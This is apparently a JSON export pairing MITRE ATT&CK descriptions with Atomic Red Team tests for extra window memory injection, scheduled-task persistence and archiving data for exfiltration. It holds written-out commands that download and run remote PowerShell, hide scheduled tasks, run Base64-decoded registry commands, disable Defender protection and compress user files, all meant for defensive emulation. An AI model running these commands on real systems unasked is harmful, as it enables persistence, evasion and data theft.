{"T1055.011": {"name": "Extra Window Memory Injection", "technique_id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298", "external_id": "T1055.011", "data_components": ["OS API Execution"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ", "atomic_tests": [{"name": "Process Injection via Extra Window Memory (EWM) x64 executable", "auto_generated_guid": "93ca40d2-336c-446d-bcef-87f14d438018", "description": "Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique", "supported_platforms": ["windows"], "input_arguments": {"arch": {"description": "Architecture of payload", "type": "string", "default": "x64", "choices": ["x64", "x86"]}, "exe_binary": {"description": "PE binary for EWM injection", "type": "path", "default": "PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe"}, "payload_file": {"description": "raw payload to inject", "type": "path", "default": "PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})", "prereq_command": "if (Test-Path #{exe_binary}) {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory (split-path #{exe_binary}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe\" -OutFile \"#{exe_binary}\" -UseBasicParsing\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin\" -OutFile \"#{payload_file}\" -UseBasicParsing"}], "executor": {"command": "#{exe_binary}", "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "name": "powershell", "elevation_required": false}}]}, "T1053.005": {"name": "Scheduled Task", "technique_id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9", "external_id": "T1053.005", "data_components": ["File Modification", "Scheduled Job Creation", "Windows Registry Key Creation", "Command Execution", "Process Creation"], "kill_chain_phases": ["execution", "persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ", "atomic_tests": [{"name": "Scheduled Task Startup Script", "auto_generated_guid": "fec27f65-db86-4c2d-b66c-61945aee87c2", "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n", "supported_platforms": ["windows"], "executor": {"command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "cleanup_command": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Scheduled task Local", "auto_generated_guid": "42f53695-ad4a-4546-abb6-7d837f644a71", "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n", "supported_platforms": ["windows"], "input_arguments": {"task_command": {"description": "What you want to execute", "type": "string", "default": "C:\\windows\\system32\\cmd.exe"}, "time": {"description": "What time 24 Hour", "type": "string", "default": "20:10"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n", "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1\n"}}, {"name": "Scheduled task Remote", "auto_generated_guid": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd", "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n", "supported_platforms": ["windows"], "input_arguments": {"task_command": {"description": "What you want to execute", "type": "string", "default": "C:\\windows\\system32\\cmd.exe"}, "time": {"description": "What time 24 Hour", "type": "string", "default": "20:10"}, "target": {"description": "Target", "type": "string", "default": "localhost"}, "user_name": {"description": "Username to authenticate with, format: DOMAIN\\User", "type": "string", "default": "DOMAIN\\user"}, "password": {"description": "Password to authenticate with", "type": "string", "default": "At0micStrong"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "cleanup_command": "SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" /F >nul 2>&1\n"}}, {"name": "Powershell Cmdlet Scheduled Task", "auto_generated_guid": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd", "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1\n"}}, {"name": "Task Scheduler via VBA", "auto_generated_guid": "ecd3fa21-7792-41a2-8726-2c5c673414d3", "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n", "supported_platforms": ["windows"], "input_arguments": {"ms_product": {"description": "Maldoc application Word", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n", "name": "powershell", "cleanup_command": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false\n"}}, {"name": "WMI Invoke-CimMethod Scheduled Task", "auto_generated_guid": "e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b", "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n", "supported_platforms": ["windows"], "input_arguments": {"xml_path": {"description": "path of vbs to use when creating masquerading files", "type": "path", "default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "File to copy must exist on disk at specified location (#{xml_path})\n", "prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml\" -OutFile \"#{xml_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n", "cleanup_command": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1\n"}}, {"name": "Scheduled Task Executing Base64 Encoded Commands From Registry", "auto_generated_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba", "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n", "supported_platforms": ["windows"], "input_arguments": {"time": {"description": "Daily scheduled task execution time", "type": "string", "default": "07:45"}}, "executor": {"command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n", "cleanup_command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Import XML Schedule Task with Hidden Attribute", "auto_generated_guid": "cd925593-fbb4-486d-8def-16cbdf944bf4", "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n", "supported_platforms": ["windows"], "input_arguments": {"xml_path": {"description": "path of vbs to use when creating masquerading files", "type": "path", "default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "File to copy must exist on disk at specified location (#{xml_path})\n", "prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml\" -OutFile \"#{xml_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n", "cleanup_command": "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1\n"}}, {"name": "PowerShell Modify A Scheduled Task", "auto_generated_guid": "dda6fc7b-c9a6-4c18-b98d-95ec6542af6d", "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n", "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1\n"}}, {"name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation", "auto_generated_guid": "704333ca-cc12-4bcf-9916-101844881f54", "description": "Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).\n", "supported_platforms": ["windows"], "input_arguments": {"task_name": {"description": "Name of the newly-added task", "type": "string", "default": "lilghostie"}, "task_command": {"description": "Command you want the task to execute", "type": "string", "default": "notepad.exe"}, "target": {"description": "System where the task should run", "type": "string", "default": "localhost"}, "user_name": {"description": "Username to authenticate with, such as ATOMICDOMAIN\\AtomicAdmin", "type": "string", "default": "$env:USERDOMAIN + '\\' + $env:USERNAME"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"}, {"description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon\n", "cleanup_command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} > nul"}}]}, "T1560.001": {"name": "Archive via Utility", "technique_id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662", "external_id": "T1560.001", "data_components": ["File Creation", "Process Creation", "Command Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)", "atomic_tests": [{"name": "Compress Data for Exfiltration With Rar", "auto_generated_guid": "02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n", "supported_platforms": ["windows"], "input_arguments": {"input_path": {"description": "Path that should be compressed into our output file", "type": "path", "default": "%USERPROFILE%"}, "file_extension": {"description": "Extension of files to compress", "type": "string", "default": ".txt"}, "output_file": {"description": "Path where resulting compressed data should be placed", "type": "path", "default": "%USERPROFILE%\\T1560.001-data.rar"}, "rar_installer": {"description": "Winrar installer", "type": "path", "default": "%TEMP%\\winrar.exe"}, "rar_exe": {"description": "The RAR executable from Winrar", "type": "path", "default": "%programfiles%/WinRAR/Rar.exe"}}, "dependencies": [{"description": "Rar tool must be installed at specified location (#{rar_exe})\n", "prereq_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n", "get_prereq_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"}}, {"name": "Compress Data and lock with password for Exfiltration with winrar", "auto_generated_guid": "8dd61a55-44c6-43cc-af0c-8bdda276860c", "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n", "supported_platforms": ["windows"], "input_arguments": {"rar_installer": {"description": "Winrar installer", "type": "path", "default": "%TEMP%\\winrar.exe"}, "rar_exe": {"description": "The RAR executable from Winrar", "type": "path", "default": "%programfiles%/WinRAR/Rar.exe"}}, "dependencies": [{"description": "Rar tool must be installed at specified location (#{rar_exe})\n", "prereq_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n", "get_prereq_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n"}}, {"name": "Compress Data and lock with password for Exfiltration with winzip", "auto_generated_guid": "01df0353-d531-408d-a0c5-3161bf822134", "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n", "supported_platforms": ["windows"], "input_arguments": {"winzip_exe": {"description": "Path to installed Winzip executable", "type": "path", "default": "%ProgramFiles%\\WinZip\\winzip64.exe"}, "winzip_url": {"description": "Path to download Windows Credential Editor zip file", "type": "url", "default": "https://download.winzip.com/gl/nkln/winzip24-home.exe"}, "winzip_hash": {"description": "File hash of the Windows Credential Editor zip file", "type": "string", "default": "B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Winzip must be installed\n", "prereq_command": "cmd /c 'if not exist \"#{winzip_exe}\" (echo 1) else (echo 0)'\n", "get_prereq_command": "IEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif(Invoke-WebRequestVerifyHash \"#{winzip_url}\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\winzip.exe\" #{winzip_hash}){\n  Write-Host Follow the installation prompts to continue\n  cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\winzip.exe\"\n}\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n"}}, {"name": "Compress Data and lock with password for Exfiltration with 7zip", "auto_generated_guid": "d1334303-59cb-4a03-8313-b3e24d02c198", "description": "Note: This test requires 7zip installation\n", "supported_platforms": ["windows"], "input_arguments": {"7zip_installer": {"description": "7zip installer", "type": "path", "default": "%TEMP%\\7zip.exe"}, "7zip_exe": {"description": "Path to installed 7zip executable", "type": "path", "default": "%ProgramFiles%\\7-zip\\7z.exe"}}, "dependencies": [{"description": "7zip tool must be installed at specified location (#{7zip_exe})\n", "prereq_command": "if not exist \"#{7zip_exe}\" (exit /b 1)\n", "get_prereq_command": "echo Downloading 7-zip installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.7-zip.org/a/7z2301-x64.exe\" #{7zip_installer}\n#{7zip_installer} /S\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir\n", "cleanup_command": "rmdir /s /Q $PathToAtomicsFolder\\T1560.001\\victim-files >nul 2>&1\n"}}, {"name": "Data Compressed - nix - zip", "auto_generated_guid": "c51cec55-28dd-4ad2-9461-1eacbc82c3a0", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_files": {"description": "Path that should be compressed into our output file, may include wildcards", "type": "path", "default": "/var/log/{w,b}tmp"}, "output_file": {"description": "Path that should be output as a zip archive", "type": "path", "default": "$HOME/data.zip"}}, "dependencies": [{"description": "Files to zip must exist (#{input_files})\n", "prereq_command": "if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then exit 0; else exit 1; fi;\n", "get_prereq_command": "(which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)\necho Please set input_files argument to include files that exist\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "zip #{output_file} #{input_files}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "Data Compressed - nix - gzip Single File", "auto_generated_guid": "cde3c2af-3485-49eb-9c1f-0ed60e9cc0af", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file": {"description": "Path that should be compressed", "type": "path", "default": "$HOME/victim-gzip.txt"}, "input_content": {"description": "contents of compressed files if file does not already exist. default contains test credit card and social security number", "type": "string", "default": "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101"}}, "executor": {"name": "sh", "elevation_required": false, "command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n", "cleanup_command": "rm -f #{input_file}.gz\n"}}, {"name": "Data Compressed - nix - tar Folder or File", "auto_generated_guid": "7af2b51e-ad1c-498c-aca8-d3290c19535a", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"input_file_folder": {"description": "Path that should be compressed", "type": "path", "default": "$HOME/$USERNAME"}, "output_file": {"description": "File that should be output", "type": "path", "default": "$HOME/data.tar.gz"}}, "dependencies": [{"description": "Folder to zip must exist (#{input_file_folder})\n", "prereq_command": "test -e #{input_file_folder}\n", "get_prereq_command": "mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "tar -cvzf #{output_file} #{input_file_folder}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "Data Encrypted with zip and gpg symmetric", "auto_generated_guid": "0286eb44-e7ce-41a0-b109-3da516e05a5f", "description": "Encrypt data for exiltration\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"test_folder": {"description": "Path used to store files.", "type": "path", "default": "/tmp/T1560"}, "test_file": {"description": "Temp file used to store encrypted data.", "type": "path", "default": "T1560"}, "encryption_password": {"description": "Password used to encrypt data.", "type": "string", "default": "InsertPasswordHere"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "gpg and zip are required to run the test.", "prereq_command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then exit 1; fi;\n", "get_prereq_command": "(which pkg && pkg install -y gnupg zip)||(which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg)\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n", "cleanup_command": "rm -Rf #{test_folder}\n"}}, {"name": "Encrypts collected data with AES-256 and Base64", "auto_generated_guid": "a743e3a6-e8b2-4a30-abe7-ca85d201b5d3", "description": "An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. \nThis atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. \nIn this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/", 